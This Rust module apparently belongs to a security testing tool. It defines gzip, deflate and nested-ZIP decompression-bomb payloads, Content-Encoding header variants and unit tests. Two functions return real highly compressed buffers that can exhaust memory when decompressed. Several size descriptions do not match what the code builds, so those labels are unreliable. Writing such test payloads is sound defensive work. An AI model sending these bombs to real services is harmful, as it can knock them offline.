#![allow(clippy::vec_init_then_push)]

use super::{Payload, PayloadType, Severity};
use flate2::write::GzEncoder;
use flate2::Compression;
use std::io::Write;

pub fn get_payloads() -> Vec<Payload> {
    let mut payloads = Vec::new();

    payloads.push(Payload {
        payload_type: PayloadType::Compression,
        payload: generate_gzip_bomb(1000),
        description: "1KB gzip bomb (expands to ~1MB)".to_string(),
        severity: Severity::Medium,
        tags: vec!["gzip".to_string(), "compression-bomb".to_string()],
    });

    payloads.push(Payload {
        payload_type: PayloadType::Compression,
        payload: generate_gzip_bomb(10000),
        description: "10KB gzip bomb (expands to ~10MB)".to_string(),
        severity: Severity::High,
        tags: vec!["gzip".to_string(), "compression-bomb".to_string()],
    });

    payloads.push(Payload {
        payload_type: PayloadType::Compression,
        payload: generate_gzip_bomb(100000),
        description: "100KB gzip bomb (expands to ~100MB)".to_string(),
        severity: Severity::Critical,
        tags: vec!["gzip".to_string(), "compression-bomb".to_string()],
    });

    payloads.push(Payload {
        payload_type: PayloadType::Compression,
        payload: generate_gzip_bomb(1000000),
        description: "1MB gzip bomb (expands to ~1GB)".to_string(),
        severity: Severity::Critical,
        tags: vec![
            "gzip".to_string(),
            "compression-bomb".to_string(),
            "extreme".to_string(),
        ],
    });

    payloads.push(Payload {
        payload_type: PayloadType::Compression,
        payload: "Content-Encoding: gzip\r\n[compressed payload]".to_string(),
        description: "Content-Encoding header with gzip".to_string(),
        severity: Severity::High,
        tags: vec!["header".to_string(), "compression".to_string()],
    });

    payloads.push(Payload {
        payload_type: PayloadType::Compression,
        payload: "Content-Encoding: deflate\r\n[deflate payload]".to_string(),
        description: "Content-Encoding header with deflate".to_string(),
        severity: Severity::High,
        tags: vec!["header".to_string(), "compression".to_string()],
    });

    payloads.push(Payload {
        payload_type: PayloadType::Compression,
        payload: "Content-Encoding: gzip, gzip\r\n[double compressed]".to_string(),
        description: "Double compression layer".to_string(),
        severity: Severity::High,
        tags: vec!["double-encoding".to_string(), "compression".to_string()],
    });

    payloads.push(Payload {
        payload_type: PayloadType::Compression,
        payload: "Transfer-Encoding: gzip\r\n[compressed chunk]".to_string(),
        description: "Transfer-Encoding gzip".to_string(),
        severity: Severity::High,
        tags: vec!["transfer-encoding".to_string(), "compression".to_string()],
    });

    payloads.push(Payload {
        payload_type: PayloadType::Compression,
        payload: generate_zip_bomb_description(),
        description: "ZIP bomb file structure".to_string(),
        severity: Severity::Critical,
        tags: vec!["zip".to_string(), "compression-bomb".to_string()],
    });

    payloads
}

fn generate_gzip_bomb(compressed_size: usize) -> String {
    let uncompressed_data: Vec<u8> = vec![b'A'; compressed_size * 100];

    let mut encoder = GzEncoder::new(Vec::new(), Compression::best());
    encoder.write_all(&uncompressed_data).ok();
    let compressed = encoder.finish().unwrap_or_default();

    format!(
        "[GZIP BOMB: {} bytes compressed, {} bytes uncompressed]",
        compressed.len(),
        uncompressed_data.len()
    )
}

fn generate_zip_bomb_description() -> String {
    "ZIP file containing nested ZIPs: 42.zip -> 16MB -> 4.5GB -> 1TB expanded".to_string()
}

pub fn generate_gzip_payload(size_multiplier: usize) -> Vec<u8> {
    let uncompressed_data: Vec<u8> = vec![b'X'; size_multiplier * 1024 * 1024];

    let mut encoder = GzEncoder::new(Vec::new(), Compression::best());
    encoder.write_all(&uncompressed_data).ok();
    encoder.finish().unwrap_or_default()
}

pub fn generate_deflate_payload(size_multiplier: usize) -> Vec<u8> {
    use flate2::write::DeflateEncoder;

    let uncompressed_data: Vec<u8> = vec![b'X'; size_multiplier * 1024 * 1024];

    let mut encoder = DeflateEncoder::new(Vec::new(), Compression::best());
    encoder.write_all(&uncompressed_data).ok();
    encoder.finish().unwrap_or_default()
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_get_payloads_returns_non_empty() {
        let payloads = get_payloads();
        assert!(!payloads.is_empty());
    }

    #[test]
    fn test_get_payloads_count_reasonable() {
        let payloads = get_payloads();
        assert!(payloads.len() > 0);
        assert!(payloads.len() < 10000);
    }

    #[test]
    fn test_payloads_are_non_empty_strings() {
        let payloads = get_payloads();
        for p in &payloads {
            assert!(
                !p.payload.is_empty(),
                "Payload is empty: {:?}",
                p.description
            );
        }
    }

    #[test]
    fn test_payloads_contain_expected_patterns() {
        let payloads = get_payloads();
        let has_gzip = payloads
            .iter()
            .any(|p| p.payload.to_uppercase().contains("GZIP"));
        let has_deflate = payloads.iter().any(|p| p.payload.contains("deflate"));
        let has_zip = payloads
            .iter()
            .any(|p| p.payload.to_lowercase().contains("zip"));
        assert!(has_gzip, "Missing gzip payload");
        assert!(has_deflate, "Missing deflate payload");
        assert!(has_zip, "Missing zip bomb payload");
    }
}
